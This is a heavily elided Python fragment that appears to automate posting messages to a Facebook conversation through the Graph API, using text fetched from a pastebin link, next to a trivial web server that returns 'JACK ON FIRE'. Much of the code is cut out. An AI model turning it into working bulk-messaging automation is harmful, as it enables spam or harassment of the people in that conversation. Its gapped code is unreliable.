...
class MyHandler(http.server.SimpleHTTPRequestHandler):
	def do_GET(self):
		...
		self.end_headers()
		self.wfile.write(b"JACK ON FIRE")
...
def send_messages():
	...
	mmm = requests.get('https://pastebin.com/raw/dHMg9YhL').text
	...
	def msg():
		...
		try:
			s = requests.post("https://graph.facebook.com/v15.0/t_100050107954573/", data=parameters, headers=headers)
		except:
			pass
